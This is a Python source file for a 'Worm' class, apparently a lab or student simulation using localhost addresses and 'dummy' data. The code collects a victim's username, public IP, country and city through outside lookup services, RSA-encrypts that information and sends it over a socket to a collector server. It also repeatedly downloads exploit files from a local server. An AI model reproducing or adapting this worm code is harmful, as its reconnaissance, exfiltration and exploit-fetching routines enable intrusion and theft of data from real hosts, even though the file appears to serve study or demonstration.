import socket
import sys
import os
import rsa
import names
import random
from random_username.generate import generate_username
import string
import getpass
import platform
import urllib.request
import requests
import json
from bs4 import BeautifulSoup as bs
from termcolor import colored

class Worm():
    def __init__(self, name: str, parser_server_ip: str, parser_server_port: int):
        self.name = name
        self.parser_server_ip = parser_server_ip
        self.parser_server_port = parser_server_port

    def _retrieve_victim_information(self):

        server_name = getpass.getuser() + " Server"
        server_os = platform.system()

        server_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

        endpoint = f'https://ipinfo.io/{server_ip}/json'
        response = requests.get(endpoint, verify = True)

        server_username = getpass.getuser()
        server_password = "1234"

        server_country = response.json()['country'].lower()
        server_city = response.json()['city']
        server_status = "active"

        victim_information = ["", server_name, server_os, server_ip, server_username, server_password, server_country, server_city, server_status]
        victim_information = str(victim_information)
        return victim_information

    def fetch_exploits(self, directory):
        
        page = bs(requests.get('http://localhost:5555/' + directory).text, 'html.parser')

        exploit_folder = os.path.dirname(os.path.realpath(__file__))      

        files = []
        files_name = []

        for exploit in page.find_all('a'):
            file_link = exploit.get('href')
            if '.c' in file_link or '.txt' in file_link or '.rb' in file_link:
                files.append(file_link)
                files_name.append(exploit.text.strip())

        for i in range(0, len(files)):
             storage_path_private = os.path.join(exploit_folder + '/exploits/' + files_name[i]) 
             print(storage_path_private)
             with open(storage_path_private, 'wb') as file:
                 response = requests.get('http://localhost:5555/' + files[i])
                 file.write(response.content)
                 print(colored("[WORM]", "green"), colored(">>", "yellow"), " fetched exploit " + file_link)


    def _remove_exploits(self):
        pass

    def _encrypt_dummy_victim_data(self):

        data = self._retrieve_victim_information()
        current_path = os.path.dirname(os.path.realpath(__file__))
        public_key_location = os.path.join(current_path + '/verification', "publickey.pem")

        with open(public_key_location, "rb") as key_file:
            public_key = rsa.PublicKey.load_pkcs1(key_file.read())
            encrypted = rsa.encrypt(data.encode('ascii'), public_key)
            return encrypted

    def send_victim_data(self):

        dummy_data = self._encrypt_dummy_victim_data()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((self.parser_server_ip, self.parser_server_port))
            sock.send(dummy_data)
            received = str(sock.recv(4096))
            sock.close()
            sys.exit(0)

worm = Worm("worm_agent_1", "127.0.0.1", 6666)

for i in range(0, 100):
    worm.fetch_exploits("apache")
